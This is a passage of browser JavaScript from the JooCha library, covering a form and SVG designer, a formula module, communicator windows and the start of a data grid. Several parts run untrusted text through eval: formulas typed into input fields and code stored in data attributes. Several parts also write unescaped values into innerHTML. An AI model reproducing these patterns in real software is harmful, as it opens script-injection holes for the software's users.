	TabIndex++;
	

	
	
	for(var iKey=0;iKey<prametersGroups.length;iKey++){
	
		var Tab=document.createElement("div");
		Tab.className="tab";
		var TabInput=document.createElement("input");
			TabInput.type="radio";
			TabInput.id="tab-"+TabIndex;
			TabInput.name="tab-group-1";
		var TabLabel=document.createElement("label");
			TabLabel.setAttribute("for","tab-"+TabIndex);
			TabLabel.innerHTML=prametersGroups[iKey].name;
		var TabContent=document.createElement("div");
			TabContent.className="content";

		var isAttr=false;
		var styleParams=prametersGroups[iKey].styleParams;
		if((!styleParams) || (styleParams==undefined) || (styleParams==null)){styleParams=prametersGroups[iKey].attributes;isAttr=true;}
		var styleParamValues=prametersGroups[iKey].styleParamValues;
		
		bHtml="";
		
		for(var k=0;k<styleParams.length;k++)
		{
			var x=styleParams[k];
			switch(x.toLowerCase())
			{
			case "hr":
			case "br":
				bHtml+="<"+x+">";
			break;
			
			default:
			
				if(typeof styleParamValues =="object" && x in styleParamValues)
				{
					var lp="text";if("type" in styleParamValues[x])lp=styleParamValues[x]["type"];
					var shw="";if("show" in styleParamValues[x])shw=styleParamValues[x]["show"];
					var lst=styleParamValues[x]["data"] || [];
					var val= (isAttr?o.getAttribute(x):computedStyle[x]);
					var valStyle= (isAttr?"":x+":"+computedStyle[x]+";");
					var valAttr= (isAttr?x+"="+o.getAttribute(x):"");
					var ph="";if("placeholder" in styleParamValues[x])ph=styleParamValues[x]["placeholder"];
					
					
					if(lp.toLowerCase()=="select")
					{
						bHtml+="<div class='elementBlock'  style=\""+(shw?shw+";"+valStyle:"")+"\"><label>"+local.T(x)+":&nbsp;</label>";
						bHtml+="<select name='"+x+"' onchange='new jc_formDesigner().xGet(\""+local.name+"\").addChangeByInputEvent(\""+o.id+"\",this,"+(isAttr?"true":"false")+")'>";
						for(var p=0;p<lst.length;p++)bHtml+="<option value='"+lst[p]+"' "+(isAttr?o.getAttribute(x):(computedStyle[x]==lst[p]?"selected=true":""))+" style=\""+(styleParamValues[x]["show"]?styleParamValues[x]["show"]+";"+x+":"+lst[p]:"")+"\">"+local.T(lst[p])+"</option>";
						bHtml+="</select>";
						bHtml+="</div>";
					}else
					if(x.toLowerCase() =="background-image"){
						bHtml+="<div class='elementBlock'  style=\""+(shw?shw+";"+valStyle:"")+"\"><label>"+local.T(x)+":&nbsp;</label><input placeholder='"+ph+"' type='"+lp+"' name='"+x+"' onchange='new jc_formDesigner().xGet(\""+local.name+"\").addChangeByInputEvent(\""+o.id+"\",this,"+(isAttr?"true":"false")+")' class='editable' contenteditable='true' value='"+local.T((isAttr?o.getAttribute(x):computedStyle[x]))+"'  style=\""+(styleParamValues[x]["show"]?styleParamValues[x]["show"]+";":"")+"\" /></div>";
					}else
					{
						bHtml+="<div class='elementBlock'  style=\""+(shw?shw+";"+valStyle:"")+"\"><label>"+local.T(x)+":&nbsp;</label><input placeholder='"+ph+"' type='"+lp+"' name='"+x+"' onchange='new jc_formDesigner().xGet(\""+local.name+"\").addChangeByInputEvent(\""+o.id+"\",this,"+(isAttr?"true":"false")+")' class='editable' contenteditable='true' value='"+local.T((isAttr?o.getAttribute(x):computedStyle[x]))+"'  style=\""+(styleParamValues[x]["show"]?styleParamValues[x]["show"]+";":"")+"\" /></div>";
					}
				}else
				{
					bHtml+="<div class='elementBlock'><label>"+local.T(x)+":&nbsp;</label><input type='text' name='"+x+"' onchange='new jc_formDesigner().xGet(\""+local.name+"\").addChangeByInputEvent(\""+o.id+"\",this,"+(isAttr?"true":"false")+")' class='editable' contenteditable='true' value='"+local.T((isAttr?o.getAttribute(x):computedStyle[x]))+"' /></div>";
				}
			}
		}		

		
	
		TabContent.innerHTML=bHtml;
	
	
		Tab.appendChild(TabInput);
		Tab.appendChild(TabLabel);
		Tab.appendChild(TabContent);
		Tabs.appendChild(Tab);
		TabIndex++;
	}
	
	/*Change Log*/
	var Tab=document.createElement("div");
	Tab.className="tab";
	var TabInput=document.createElement("input");
		TabInput.type="radio";
		TabInput.id="tab-"+TabIndex;
		TabInput.name="tab-group-1";
	var TabLabel=document.createElement("label");
		TabLabel.setAttribute("for","tab-"+TabIndex);
		TabLabel.innerHTML="Change Log";
		//TabLabel.onclick=local.refreshChangeLog;
	var TabContent=document.createElement("div");
		TabContent.className="content";
		TabContent.innerHTML="";
		
	var TabChangeLog=document.createElement("pre");		
	TabChangeLog.className="preText";
	TabChangeLog.id=local.WindowId+"ChangeLogId";
	TabContent.appendChild(TabChangeLog);
		
	var TabRefreshBut=document.createElement("div");		
	TabRefreshBut.className="button";
	TabRefreshBut.innerHTML="Refresh";
	TabContent.appendChild(TabRefreshBut);
	
	AddEventOnObject(TabRefreshBut,"click",local.refreshChangeLog);
	
	Tab.appendChild(TabInput);
	Tab.appendChild(TabLabel);
	Tab.appendChild(TabContent);
	Tabs.appendChild(Tab);
	TabIndex++;

	local.Window.style.display="inline-block";
}

//-------------------------------------------------
//-------------- OPERATION ON OBJECT --------------
//-------------------------------------------------
this.createObject=function createObject(target){
    var o;
	if(local.parent.tagName.toLowerCase()=="svg"){
		local.ActiveNS=local.SVGNS;
        o = document.createElementNS("http://www.w3.org/2000/svg", "rect");
		o.setAttribute("x","0px");
		o.setAttribute("y","0px");
		o.setAttribute("width","100px");
		o.setAttribute("height","30px");
		o.setAttribute("fill","red");
		o.setAttribute("className","default");
		o.setAttribute("class","default");
	}else {
		local.ActiveNS=local.xHTML;	
		o=document.createElementNS(local.ActiveNS,"DIV");
		o.className="default";
	}

	if(!o.id)o.setAttribute("id",local.generateNewId());
	o.setAttribute("data-mark","standard");
	o.setAttribute("name",o.id);
	o.setAttribute("data-parent-id",local.parent.id);
	
	local.addLayerObject(o.getAttribute("id"));

	
	//document.getElementById(local.parent.id).appendChild(o);
	local.parent.appendChild(o);
	local.moveObject(o);
}
//------------------------------------------------
this.setXMLNS=function setXMLNS() {
   if(local.parent.tagName=="SVG"){
	   local.ActiveNS=local.SVGNS;
	   for(var v in local.svgAttributes)
		local.parent.setAttribute(v,local.svgAttributes[v]);
   }
   else {
   	   for(var v in local.svgAttributes)local.parent.removeAttribute(v);
		local.ActiveNS=local.xHTML;	
		local.parent.setAttribute("xmlns",local.ActiveNS);
   }
}
//-------------------
this.handleDrop=function handleDrop(evnt) {
	var e=evnt || window.event;
	var target=e.target || e.srcElement;

	var maxPar=10;
	while(target.tagName.toLowerCase()!="LI"){
		target=target.parentElement || target.parentNode;
		if(target.getAttribute("data-handle-id"))break;
		maxPar--;if(maxPar<=0)break;
		console.log(target);
		
	}
//console.log(target);
//console.log(local._DragSrcEl);
  if (local._DragSrcEl != target) {
	target.parentNode.insertBefore(local._DragSrcEl,target);//Now Prepaire
	var nid=local._DragSrcEl.getAttribute("data-handle-id");
	var oid=target.getAttribute("data-handle-id");
	var nwo=document.getElementById(nid);
	var old=document.getElementById(oid);
	old.parentNode.insertBefore(nwo,old);
  }
  if(target.classList)target.classList.remove('dragOver');
  if(this.classList)this.classList.remove('dragOver');
  
  if (e.stopPropagation) {
    e.stopPropagation(); 
  }
  
  return false;
}
//------------------
this.addLayerObject=function addLayerObject(idnm){
	var itemO=document.createElement("LI");
	var itemA=document.createElement("a");
	var itemDel=document.createElement("b");
	itemO.id=local.layerItemPrefix+idnm;
	itemO.setAttribute("draggable",true);
	itemO.className="draggable";
	itemO.setAttribute("data-handle-id",idnm);
	itemO.setAttribute("data-layer-id",local.layerItemPrefix+idnm);
	AddEventOnObject(itemO,"click",function(ev){
		var evnt=ev || window.event;
		var idnm=this.getAttribute("data-handle-id");
		var lid=this.getAttribute("data-layer-id");
		local.unselect();
		if(lid)try{addClass(document.getElementById(lid),"choose");}catch(err){};
		if(idnm)try{addClass(document.getElementById(idnm),"choose");}catch(err){};
		evnt.stopPropagation();
		return false;
	});
	addDnDHandlers(itemO,{"drop":local.handleDrop,"dragstart":local.onMouseDragStart});
	
	
	//addClass(itemO,"drag");
	itemO.appendChild(itemA);
	itemA.innerHTML=idnm;
	itemDel.innerHTML="X";
	itemDel.setAttribute("data-handle-id",idnm);
	itemDel.setAttribute("data-layer-id",local.layerItemPrefix+idnm);
	AddEventOnObject(itemDel,"click",function(ev){
		var evnt=ev || window.event;
		//var target = ev.target || ev.srcElement;
		//console.log(this);
		var idnm=this.getAttribute("data-handle-id");
		var lid=this.getAttribute("data-layer-id");
		if(lid)try{RemoveObjectEx(document.getElementById(lid));}catch(err){};
		if(idnm)try{RemoveObjectEx(document.getElementById(idnm));}catch(err){};
		evnt.stopPropagation();
		return false;
	});
	itemO.appendChild(itemDel);
	local.layerBox.appendChild(itemO);
	
}

//-------------------------------------------------
this.moveObject=function moveObject(o){
	addClass(o,"moving");
	addClass(o,"drag");
	o.setAttribute("draggable",true);
	if(!o.id)o.id=local.generateNewId();
}
//-------------------------------------------------
this.stopObject=function stopObject(o){
	delClass(o,"moving");
	delClass(o,"drag");
	if(!o.id)o.id=local.generateNewId();
	o.removeAttribute("draggable");
}
//-------------------------------------------------
this.copyVariables=function copyVariables(o){
	local.WindowId=o.WindowId;
	local.wBody=o.wBody;
	local.wHead=o.wHead;
	local.wTitle=o.wTitle;
	local.wClose=o.wClose;
}

//-------------------------------------------------
//--------- Graphical Script ----------------------
//-------------------------------------------------
this.drawInlineSVG=function drawInlineSVG(svgElement, ctx, callback,format){
  if(!format)format="storage";
  if(!svgElement || svgElement==undefined || svgElement==null)svgElement=local.parent;
  var cpb=svgElement.getAttribute("data-event-svgdraw");
  if(cpb){eval(cpb);return;}
  
  if(!ctx)ctx=local.ctx;
  
  local.doInlineSave(svgElement);
  
  for(var atr in local.svgAttributes){
	svgElement.setAttribute(atr,local.svgAttributes[atr]);
  }
  var svgURL = new XMLSerializer().serializeToString(svgElement);
  var img  = new Image();
  img.onload = function(){
		if(!ctx || ctx==undefined || ctx==null)ctx=local.ctx;
		ctx.drawImage(this, 0,0);
		if(callback)callback();
    }
  img.src = 'data:image/svg+xml; charset=utf8, '+encodeURIComponent(svgURL);
  //console.log(svgElement);
}
//-------------------------------------------------
this.drawInlineDIV=function drawInlineDIV(__Element, contentParam, callback){
   local.setXMLNS();
   
  if(!__Element || __Element==undefined || __Element==null)__Element=local.parent;
  var cpb=__Element.getAttribute("data-event-inlinedraw");
  if(cpb){eval(cpb);return;}
  
//var canvas = document.createElement('canvas');
//var canvas=document.getElementById(local.canvasId);
//var ctx = canvas.getContext('2d');

console.log(__Element.outerHTML);
var data = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">' +
           '<foreignObject width="100%" height="100%">' +
		   __Element.outerHTML+
           '</foreignObject>' +
           '</svg>';

var DOMURL = window.URL || window.webkitURL || window;

var img = new Image();
var svg = new Blob([data], {type: 'image/svg+xml'});
var url = DOMURL.createObjectURL(svg);

img.onload = function() {
  local.ctx.drawImage(img, 0, 0);
  DOMURL.revokeObjectURL(url);
}

img.src = url;  
//document.body.insertBefore(img,__Element);
//document.body.appendChild(canvas);

  
}
//-------------------------------------------------
this.doInlineSave=function doInlineSave(svgElement, callback, format){
  if(!format)format="storage";
  format=format.toLowerCase();
  if(!svgElement || svgElement==undefined || svgElement==null)svgElement=local.parent;
  var cpb=svgElement.getAttribute("data-event-inlinesave");
  if(cpb){eval(cpb);return;}
  else 
  {
	var attrs={};
	var names=[],values=[];
	for(var i=0;i<svgElement.attributes.length;i++){
       names[i]=svgElement.attributes[i].nodeName;
	   values[i]=svgElement.attributes[i].value || svgElement.attributes[i].nodeValue;
	}
	attrs.content=svgElement.innerHTML;
	attrs.names=names;
	attrs.values=values;
	localStorage.setItem(local.storageItemName, JSON.stringify(attrs));
	if(format=="mvg"){
	  var postData=document.getElementById(local.myObjectId+"_FileData");
	  if(!postData){
		postData=document.createElement("TEXTAREA");
		postData.id=local.myObjectId+"_FileData";
		postData.style.display="none";
		local.formAsyncPurpose.appendChild(postData);
	  }
	  var postType=document.getElementById(local.myObjectId+"_FileType");
	  if(!postType){
		postType=document.createElement("INPUT");
		postType.id=local.myObjectId+"_FileType";
		postType.setAttribute("type","hidden");
		postType.setAttribute("placeholder","Enter File Extension Type");
		local.formAsyncPurpose.appendChild(postType);
	  }
	  var postName=document.getElementById(local.myObjectId+"_FileName");
	  if(!postName){
		postName=document.createElement("INPUT");
		postName.id=local.myObjectId+"_FileName";
		postName.setAttribute("type","text");
		postName.setAttribute("placeholder","Enter File Name");
		local.formAsyncPurpose.appendChild(postName);
	  }
	  
	  var postSubmit=document.getElementById(local.myObjectId+"_FileDownload");
	  if(!postSubmit){
		postSubmit=document.createElement("INPUT");
		postSubmit.id=local.myObjectId+"_FileDownload";
		postSubmit.setAttribute("type","submit");
		local.formAsyncPurpose.appendChild(document.createElement("BR"));
		local.formAsyncPurpose.appendChild(postSubmit);
	  }
	  
	  
	  postData.name="content";
	  postType.name="type";
	  postName.name="name";
	  postSubmit.value="Download";
	  
	  postData.value=JSON.stringify(attrs);
	  postType.value="mvg";
	  postName.value=local.myObjectId;
	  
		local.wBody.innerHTML="";
		local.wBody.appendChild(local.formAsyncPurpose);
		local.Window.style.display="inline-block";
	  
	}
	
	
  }
	if(callback)callback();
 
  
 
 
 
  //console.log(svgElement);
}
//-------------------------------------------------
this.doInlineClear=function doInlineClear(svgElement, callback){
  if(!jconfirm("do you want Clear this desk?")){return;};
  if(!svgElement || svgElement==undefined || svgElement==null)svgElement=local.parent;
  var cpb=svgElement.getAttribute("data-event-inlineclear");
  if(cpb){eval(cpb);return;}
  else
  {
    svgElement.innerHTML=""; 
	localStorage.setItem(local.storageItemName, "");
  }
	if(callback)callback();
}
//-------------------------------------------------
this.recoveryLayerPanel=function recoveryLayerPanel(svgElement){
	if(!svgElement || svgElement==undefined || svgElement==null)svgElement=local.parent;
	local.layerBox.innerHTML="";
	
	var chlds=local.parent.childNodes;
	//console.log(chlds);
	for(var ky=0;ky<chlds.length;ky++)if(chlds[ky].nodeType==1){
		//console.log(chlds[ky]);
		if(chlds[ky].id){
			local.addLayerObject(chlds[ky].id);
		}
	}
	
}

this.recoveryDeskFromStorage=function recoveryDeskFromStorage(){
	var dataHtml=localStorage.getItem(local.storageItemName);
	
	
	if(dataHtml && dataHtml.length>50){
		dataHtml=JSON.parse(dataHtml);
		local.parent.innerHTML=dataHtml.content;
		for(var i=0;i<dataHtml.names.length;i++){
			local.parent.setAttribute(dataHtml.names[i],dataHtml.values[i]);
		}
	}
}


//usage :
//drawInlineSVG(document.querySelector('svg'), ctxt, function(){console.log(canvas.toDataURL())})

//-------------------------------------------------
//-------------------------------------------------
//-------------------------------------------------
	this.openMenu=function openMenu(){
		if(local.rightMenu){
			local.rightMenu.style.display="inline-block";
			local.rightMenu.style.position="fixed";
			local.rightMenu.style.zIndex=20001;
		}
	}
//------------------------------------------------------
	this.closeMenu=function closeMenu(){
		if(local.rightMenu){
			local.rightMenu.style.display="none";
			local.rightMenu.style.position="";
		}
	}
	
//------------------------------------------------------
	this.closeMenuOnBlure=function closeMenuOnBlure(event,vId){
		event = event || window.event;
		event.target = event.target || event.srcElement;
		var element = event.target;
		
		if(!vId || vId==undefined)vId=local.name;
		if(xFormDesignersById[vId])xFormDesignersById[vId].closeMenu();
	}	
//------------------------------------------------------
if(this.parent != null && this.parent != undefined)this.init();
//------------------------------------------------------
	//Public static functions
	this.xGet=function xGet(nm)
	{
		if(nm in xFormDesignersById)return xFormDesignersById[nm];
		
		for(var i=xFormDesigners.length-1;i>=0;i--){
		if(xFormDesigners[i] && xFormDesigners[i]!=undefined && xFormDesigners[i]!=null)
			if(xFormDesigners[i].name==nm)
				return xFormDesigners[i];
		}
		return null;
	};


}
//======================================================
/*xSelect Loader*/
function xFormDesignersStartUp(clsName)
{
	var objNameSpace="xFormDesigner";
	if(!clsName)clsName=objNameSpace;
	var els=document.getElementsByClassName(clsName);
	
	for(var i=0;i<els.length;i++){
		var o=new jc_formDesigner(els[i]);
		o.recoveryDeskFromStorage();
		o.recoveryLayerPanel();
		
	}
}
//======================================================
AddEventOnObject(window,"load",function(){xFormDesignersStartUp();});
//window.onload=function (){FormularLoading(document);};
//======================================================


/* jc_formular.js */

//AddEventOnObject(window,"load",function (){FormularLoading(document);});
window.onload=function (){FormularLoading(document);};
//----------------------------------------
var FormularMode=true;
var FormulalVarDate=new Date();
var fncMath=new Array('abs','acos','asin','atan','atan2', 'ceil', 'cos', 'exp', 'floor', 'log', 'max', 'min', 'pow', 'random', 'round', 'sin', 'sqrt', 'tan','SQRT1_2','SQRT2','PI','LOG2E','LOG10E','LN2','LN10','E');
var fncDate=new Array('getDate','getDay','getFullYear','getHours','getMilliseconds','getMinutes','getMonth','getSeconds','getTime','getTimezoneOffset','getUTCDate','getUTCDay','getUTCFullYear','getUTCHours','getUTCMilliseconds','getUTCMinutes','getUTCMonth','getUTCSeconds','getVarDate','getYear','parse','setDate','setFullYear','setHours','setMilliseconds','setMinutes','setMonth','setSeconds','setTime','setUTCDate','setUTCFullYear','setUTCHours','setUTCMilliseconds','etUTCMinutes','setUTCMonth','setUTCSeconds','setYear','toDateString','toGMTString','toLocaleDateString','toLocaleString','toLocaleTimeString','toString','toTimeString','toUTCString','UTC','valueOf');
var FormularOldBlur=new Array();
var FormularOldFocus=new Array();
var FormularOldCounter=0;
/*
SubDate(dt1,dt2);
jc_round(n,p);
*/
//------------------------------------------------------------
function indexOf(arr,str)
{
  for(var i=0;i<arr.length;i++)
  if(arr[i]==str)return i;
return -1;
}
//------------------------------------------------------------
function jc_round(n,p)
{
var r=Math.pow(10,p);
if(r)return Math.round(n*r)/r;
return Math.round(n);
}
//------------------------------------------------------------
function Formular(str,frm)
{
var cmd="";
var splitchars="~!#$%^&*()-+=[]{};:'\"\\|,<>/?";
var splitstring=new Array();
//FormulalVarDate

var cnt=0;
var pKK=false;
var pLL=false;
var smb=false;

splitstring[cnt]="";
for(var i=0;i<=str.length;i++)
{
   if((!pKK)&&(!pLL)&&(i<str.length))
   {
       if(str.charAt(i)=='"')pKK=!pKK;
       if(str.charAt(i)=='\'')pLL=!pLL;
   }

   if(((splitchars.indexOf(str.charAt(i))==-1)||(pKK)||(pLL))&&(i<str.length))
   {
         if(smb){cnt++;splitstring[cnt]="";}
         smb=false;
         splitstring[cnt]+=str.charAt(i);
   }else
   {
     if((!smb)&&(splitstring[cnt]))
     {
         if(indexOf(fncMath,splitstring[cnt])!=-1){splitstring[cnt]="Math."+splitstring[cnt];}
         else
         if(indexOf(fncDate,splitstring[cnt])!=-1){splitstring[cnt]="FormulalVarDate."+splitstring[cnt];}
         else
         if((frm)&&(!isFinite(splitstring[cnt])))
         {
try{
           var codetype=1;
           var Childs=frm.getElementsByTagName('input');
           if(!Childs){Childs=frm.all;codetype=2;};
           var obj=Childs[splitstring[cnt]];

           if(obj)
           switch(obj.tagName.toLowerCase())
           {
               case 'textarea':
               case 'input':splitstring[cnt]="document.getElementById('"+splitstring[cnt]+"').value";
               break;
           }
}catch(e){};

        }

      }

       if(!smb){cnt++;splitstring[cnt]="";}
       smb=true;
       splitstring[cnt]+=str.charAt(i);
   }
   if(pKK)if(str.charAt(i)=='"')pKK=!pKK;
   if(pLL)if(str.charAt(i)=='\'')pLL=!pLL;
}

for(var i=0;i<splitstring.length;i++)cmd+=splitstring[i];

    var ret='';
    try
    {
        if(window.eval)ret=window.eval(cmd)
        else
        if(eval)ret=eval(cmd);
    }catch(e){};
   return ret;
}
//-------------------------------------------------------------
function FormularSetObject(th,str)
{
   if((th.id)||(th.name))
   {
      var nobj=th.id;
      var frmindx="___formular";
      if(!nobj)nobj=th.name;
      if(th.form)
      {
         var Childs=th.form.getElementsByTagName('input');
         if(!Childs)Childs=objPar.all;

         var nv=Childs[nobj+frmindx];
         if(nv)
         {
            nv.value=str;
         }
         else
         {
            var t=document.createElement("input");
            t.id=nobj+frmindx;
            t.name=nobj+frmindx;
            t.type='hidden';
            t.value=str;
            th.form.appendChild(t);
         }
      }
   }
return str;
}
//-------------------------------------------------------------
function FormularClearObject(th)
{
   FormularSetObject(th,"clear");
}
//-------------------------------------------------------------
function OnBlurFunctional(th)
{
  var th=th;if(!th)th=this;
  if(!FormularMode)return false;

  var str=th.value;
  if(str)
  if(str.charAt(0)=='=')
  {
       str=str.substr(1);
       th.setAttribute('data-formular',str);
       FormularSetObject(th,str);
       th.value=Formular(str,th.form);
  }else
  {
       th.setAttribute('data-formular',"");
       FormularClearObject(th);
  }

  var fpo=th.getAttribute('data-formular-position');//formular_position
  var idnm=th.getAttribute('id');
  if(FormularOldBlur[fpo])
  {
    var cmd=new String(FormularOldBlur[fpo]);
    var p1=cmd.indexOf("function");
    if((p1>=0)&&(p1<8))
    {
        var p2=cmd.indexOf("{");
        cmd=cmd.substr(p2);
    }

    cmd="var This=document.getElementById('"+idnm+"');"+cmd.replace(/this/gi,"This");

    try{
      eval(cmd);
    }catch(e)
    {
      alert("Error: "+cmd);
    }
  }
   
}
//-------------------------------------------------------------
function ExecFormularFunction(th2)
{
  var th=th2;if(!th)th=this;
  if(!FormularMode)return false;

  var str=th.value;
  
  if(str)
  if(str.charAt(0)=='=')
  {
       str=str.substr(1);
       th.setAttribute('data-formular',str);
       FormularSetObject(th,str);
       th.value=Formular(str,th.form);
       return 0;
  }

  var f1=th.getAttribute('data-formular');
  if(f1)th.value=Formular(f1,th.form);

}
//-------------------------------------------------------------
function OnEnterFunctional(th2)
{
  var th=th2;if(!th)th=this;
  if(!FormularMode)return false;

  var f1=th.getAttribute('data-formular');
  if(f1)
  {
     th.value="="+f1;
     th.setAttribute('data-formular',"");
  }

  var fpo=th.getAttribute('data-formular-position');
  var idnm=th.getAttribute('id');
  if(FormularOldFocus[fpo])
  {
    var cmd=new String(FormularOldFocus[fpo]);

    var p1=cmd.indexOf("function");
    if((p1>=0)&&(p1<8))
    {
        var p2=cmd.indexOf("{");
        cmd=cmd.substr(p2);
    }


    cmd="var This=document.getElementById('"+idnm+"');"+cmd.replace(/this/gi,"This");

    try{
        eval(cmd);
    }catch(e)
    {
//      alert("Error: "+cmd);
    }
  }
}
//---------------------------------------------------------------
function InitFormularFieldMasks(FieldsMaskArray)
//function InitFieldMasks(FieldsMaskArray)// Public
{
    var Masks=new Array();
	var Parsers=new Array();
	var idx=0;
	var msk,ky,tp,chrs,msg;
    var decimalSeparator = ".";
    var groupSeparator = "";
	var ln;
	
	try{
	for(var i in FieldsMaskArray)
	{
	   ky=tp=chrs=msg="";
	   ln=FieldsMaskArray[i].length;
	   if(ln>0)ky=FieldsMaskArray[i][0];
	   if(ln>1)tp=FieldsMaskArray[i][1];
   	   if(ln>2)chrs=FieldsMaskArray[i][2];
	   if(ln>3)msg=FieldsMaskArray[i][3];	
   	   if(ln>4)llmin=FieldsMaskArray[i][4];	   
	   if(ln>5)llmax=FieldsMaskArray[i][5];	   		   
	   
	   
	   switch(tp)
	   {
	     case "date":
		{
		    msk=chrs;
			if(msk=="")msk="dd/MM/yyyy";
		    Parsers[idx] = new DateParser(msk, false, new Date());
		    Masks[idx]=new DateMask(Parsers[idx], ky);
			if(msg)Masks[idx].validationMessage = msg;
			idx++;
		}
		 break;
	     case "int":
		 {
			msk=new Input("-0123456789");
		    Masks[idx] = new InputMask(msk, ky);	
			if(msg)Masks[idx].validationMessage = msg;
			idx++;
		}
		 break;
	     case "float":
		 {
		    msk=new Input("-0123456789.");
			Masks[idx] = new InputMask(msk, ky);
			if(msg)Masks[idx].validationMessage = msg;
			idx++;
		}
		 break;
	     case "percent":
		 {
			/*var numParser4 = new NumberParser(2, ".", " ", true,'');
			numParser4.endSymbol = "%";
			numParser4.useEnd = true;
			numParser4.negativeParenthesis = true;
			numParser4.currencyInside = true;
			Masks[idx] = new NumberMask(numParser4, ky, 6);
			Masks[idx].leftToRight = true;
			if(msg)Masks[idx].validationMessage = msg;*/
		 
		    msk=new Input("-0123456789.%");
			Masks[idx] = new InputMask(msk, ky);
			if(msg)Masks[idx].validationMessage = msg;
			idx++;
		}
		 break;
		 
		 
	     case "chars":
		 {
			msk=new Input(chrs);
		    Masks[idx] = new InputMask(msk, ky);	
			if(msg)Masks[idx].validationMessage = msg;
			if(llmax)
			{
			    new SizeLimit(ky, llmax);
			}
			
			idx++;
		}
		 break;
	     case "limit":
		 {
			var locmin=chrs;
			var locmax=msg;
		    new SizeLimit(ky, locmax);

			idx++;
		}
		 break;
		 
		 
	     default:
 		    msk=chrs;
			if(msk!="")
			{
				Masks[idx] = new InputMask(msk, ky);	
			    if(msg)Masks[idx].validationMessage = msg;
				if(llmax)
				{
					new SizeLimit(ky, llmax);
				}
				idx++;
			}
		 break;
		}
	}
	}catch(e){console.log("Not include inputMask.js");}
}


//-------------------------------------------------------------
function FormularLoadingEx(objPar,par)///par - normal, par=1 all blur
{
var Childs=objPar.getElementsByTagName('input');
if(!Childs)Childs=objPar.all;
if(!par)par=0;

if(Childs)
{
   for(var i = 0; i <Childs.length; i++)
   if(Childs[i].tagName)
   {
      if(Childs[i].tagName.toLowerCase()=='input')
      if(Childs[i].getAttribute('data-formular',1))
        {
	switch(par)
	{
	    case 1:OnEnterFunctional(Childs[i]);break;
	    case 2:ExecFormularFunction(Childs[i]);break;
	    default://Initialize
	    {

            if(Childs[i].getAttribute('data-formular')==1)Childs[i].setAttribute('data-formular','');

			/*old version, new version is jc_mask
			var onm=Childs[i].getAttribute('id');
			if(!onm)onm=Childs[i].getAttribute('name');

			var MskType,MskParam,MskErrMsg;
			MskType=Childs[i].getAttribute('data-mask-type');
			MskParam=Childs[i].getAttribute('data-mask-param');
			MskChars=Childs[i].getAttribute('data-mask-chars');
			MskErrMsg=Childs[i].getAttribute('data-mask-errmsg');
			var Arr=new Array();
			Arr[0]=new Array(onm,MskType,MskParam,MskChars,MskErrMsg);
			if(MskType)alert(MskType);
			InitFormularFieldMasks(Arr);
			*/

				
			FormularOldBlur[FormularOldCounter]=Childs[i].onblur;
			FormularOldFocus[FormularOldCounter]=Childs[i].onfocus;
			Childs[i].setAttribute('data-formular-position',FormularOldCounter);
			FormularOldCounter++;

			
    	    if(BrowserType==1)
  	        {
			    //AddEventOnObject(Childs[i],'focus',OnEnterFunctional);
				//AddEventOnObject(Childs[i],'blur',OnBlurFunctional);
	            Childs[i].onfocus=OnEnterFunctional;
	            Childs[i].onblur=OnBlurFunctional;
	        }
	        else
  	        {
			    //AddEventOnString(Childs[i],'focus',"OnEnterFunctional(this)");
				//AddEventOnString(Childs[i],'blur',"OnBlurFunctional(this)");
	            Childs[i].setAttribute('onfocus',"OnEnterFunctional(this)");
	            Childs[i].setAttribute('onblur',"OnBlurFunctional(this)");
	        }
	        ExecFormularFunction(Childs[i]);
	    }
	}
        }
   }
}

}
//-------------------------------------------------------------
function FormularLoading(objPar)
{
   if(!objPar)objPar=document;
   FormularLoadingEx(objPar);
}
//-------------------------------------------------------------
function FormularSubmit(objPar)
{
   if(!objPar)objPar=document;
   FormularLoadingEx(objPar,2);//for all exec
}
//----------------------------------------------------


/* jc_communicator.js */

function OpenCommunicatorList()
{
    var Width='100%';
    var Height= '100%';
    var idcom=0;

   GLOBWINDOWNAME='';
   WinSetZoom(200,480);
   WinSetCenter();

   AlphaMainWin(0.5);
   idcom=CreateHTMLWindow();

      WinSetZoom('20','48');
      WinAffectSize(idcom);

var htmv="<iframe src=\"?phpParam=listusers.php&sid="+SID+"&scriptinitial=y\" style='width:100%;height:460px;border:2px groove black;'></iframe>";
WinStartResizing(idcom,GLOBWINOBJLEFT,GLOBWINOBJTOP,200,480,10,htmv);

return idcom;
}
//--------------------------
function OpenCommunicator(usernm)
{
    var Width='100%';
    var Height= '100%';
    var idcom=0;

   FireHandleParent=1;
   ParentWindow.WinSetZoom(640,480);
   ParentWindow.WinSetCenter();

   ParentWindow.AlphaMainWin(0.5);


   ParentWindow.GLOBWINDOWNAME=usernm;
   idcom=ParentWindow.CreateHTMLWindow();

      ParentWindow.WinSetZoom('64','48');
      ParentWindow.WinAffectSize(idcom);

      var htmv="<iframe src=\"?phpParam=communicator.php&sid="+SID+"&scriptinitial=y&i_users="+usernm+"\" style='width:100%;height:460px;'></iframe>";
      ParentWindow.WinStartResizing(idcom,ParentWindow.GLOBWINOBJLEFT,ParentWindow.GLOBWINOBJTOP,640,480,10,htmv);

     FireHandleParent=0;

return idcom;
}


/* jc_grid.js */

/**
 * js_grid - JavaScript JooCha Library
 *
 * Data table manager, need server side support and work JSON or XML content
 * 
 * @link    http://joocha.com
 * @license For open source use: GPLv3
 *          For commercial use: Commercial License
 * @author  John Chavchanidze
 * @version 1.0.1
 *
 * See usage examples at http://joocha.com/examples
 */
 
var jcGridCounter=0;
var xGridObjects=[];
var xGridObjectsById={};
//------------------------------------
function jc_grid(vObjectOrId,vTableId,vClassName,vNext,vUrl,vCallBack,vDataType,xChange)
{
var local=this;
this.ObjectCounter=(jcGridCounter+1);jcGridCounter++;
this.vObjectOrId=vObjectOrId;
this.vTableId=vTableId;
this.vClassName=vClassName;
this.vNext=vNext;
this.vUrl=vUrl;
this.vCallBack=vCallBack;
this.vDataType=vDataType;
this.xChange=xChange;

	this.nextFN="gc";//nextFormName	
	this.QueryLink=this.QueryProc=null;
	this.QueryType='xml';
	this.tableId='';
	this.debug=0;
	this.TagType="table";
	this.afterCallBack=null;


this.tableObject='';
this.tableHead='';
this.tableBody='';
this.tableFoot='';
this.hasDataHeader=0;
this.firstInitialize=0;
this.rowLatestID=0;
this.rowCount=0;
this.colLatestID=0;
this.colCount=0;
this.columnsId=new Array();
this.columnsDBId=new Array();
this.columnsDBField=new Array();
this.columnsCallbacks=new Array();
this.rowsId=new Array();
this.rowsDBId=new Array();
this.CurrentCell=0;
this.CurrentRow=0;

this.DefLink="";
this.DefParams="";
this.PostParams="";
this.LinkTableID="id";
this.afterEventProc=0;
this.QueryResponse=""

